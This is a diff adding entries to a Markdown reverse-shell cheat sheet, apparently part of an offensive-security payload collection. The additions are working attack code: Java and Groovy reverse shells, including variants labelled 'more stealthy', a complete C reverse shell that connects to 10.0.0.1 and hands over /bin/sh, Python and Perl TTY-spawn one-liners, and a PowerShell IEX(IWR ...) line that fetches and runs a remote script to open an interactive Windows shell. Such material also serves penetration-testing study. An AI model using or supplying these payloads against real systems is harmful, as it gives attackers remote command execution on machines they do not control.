@@ -18,10 +18,14 @@
     * [Powershell](#powershell)
     * [Awk](#awk)
     * [Java](#java)
+    * [Java Alternative 1](#java-alternative-1)
+    * [Java Alternative 2](#java-alternative-2)
     * [War](#war)
     * [Lua](#lua)
     * [NodeJS](#nodejs)
     * [Groovy](#groovy)
+    * [Groovy Alternative 1](#groovy-alternative-1)
+    * [C](#c)
 * [Meterpreter Shell](#meterpreter-shell)
     * [Windows Staged reverse TCP](#windows-staged-reverse-tcp)
     * [Windows Stageless reverse TCP](#windows-stageless-reverse-tcp)
@@ -50,6 +54,8 @@ sh -i >& /dev/udp/10.0.0.1/4242 0>&1
 Listener:
 nc -u -lvp 4242
 ```
+
+Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash
 
 ### Socat
 
@@ -190,6 +196,29 @@ awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& 
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
+
+```
+
+#### Java Alternative 1
+
+```java
+String host="127.0.0.1";
+int port=4444;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+```
+
+#### Java Alternative 2
+**NOTE**: This is more stealthy
+
+```java
+Thread thread = new Thread(){
+    public void run(){
+        // Reverse shell here
+    }
+}
+thread.start();
 ```
 
 ### War
@@ -250,11 +279,55 @@ https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
 NOTE: Java reverse shell also work for Groovy
 
-```javascript
+```java
 String host="10.0.0.1";
 int port=4242;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+
+#### Groovy Alternative 1
+**NOTE**: This is more stealthy
+
+```java
+Thread.start {
+    // Reverse shell here
+}
+```
+
+### C
+
+Compile with `gcc /tmp/shell.c --output csh && csh`
+
+```csharp
+#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+int main(void){
+    int port = 4242;
+    struct sockaddr_in revsockaddr;
+
+    int sockt = socket(AF_INET, SOCK_STREAM, 0);
+    revsockaddr.sin_family = AF_INET;       
+    revsockaddr.sin_port = htons(port);
+    revsockaddr.sin_addr.s_addr = inet_addr("10.0.0.1");
+
+    connect(sockt, (struct sockaddr *) &revsockaddr, 
+    sizeof(revsockaddr));
+    dup2(sockt, 0);
+    dup2(sockt, 1);
+    dup2(sockt, 2);
+
+    char * const argv[] = {"/bin/sh", NULL};
+    execve("/bin/sh", argv, NULL);
+
+    return 0;       
+}
 ```
 
 ## Meterpreter Shell
@@ -343,9 +416,12 @@ Spawn a TTY shell from an interpreter
 
 ```powershell
 /bin/sh -i
-python -c 'import pty; pty.spawn("/bin/sh")'
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+python3 -c "__import__('pty').spawn('/bin/bash')"
+python3 -c "__import__('subprocess').call(['/bin/bash'])"
 perl -e 'exec "/bin/sh";'
 perl: exec "/bin/sh";
+perl -e 'print `/bin/bash`'
 ruby: exec "/bin/sh"
 lua: os.execute('/bin/sh')
 ```
@@ -354,6 +430,39 @@ lua: os.execute('/bin/sh')
 - vi: `:set shell=/bin/bash:shell`
 - nmap: `!sh`
 - mysql: `! bash`
+
+Alternative TTY method
+
+```
+www-data@debian:/dev/shm$ su - user
+su: must be run from a terminal
+
+www-data@debian:/dev/shm$ /usr/bin/script -qc /bin/bash /dev/null
+www-data@debian:/dev/shm$ su - user
+Password: P4ssW0rD
+
+user@debian:~$ 
+```
+
+## Fully interactive reverse shell on Windows
+The introduction of the Pseudo Console (ConPty) in Windows has improved so much the way Windows handles terminals.
+
+**ConPtyShell uses the function [CreatePseudoConsole()](https://docs.microsoft.com/en-us/windows/console/createpseudoconsole). This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763).**
+
+
+Server Side:
+
+```
+stty raw -echo; (stty size; cat) | nc -lvnp 3001
+```
+
+Client Side:
+
+```
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
+```
+
+Offline version of the ps1 available at --> https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1
 
 ## References
 
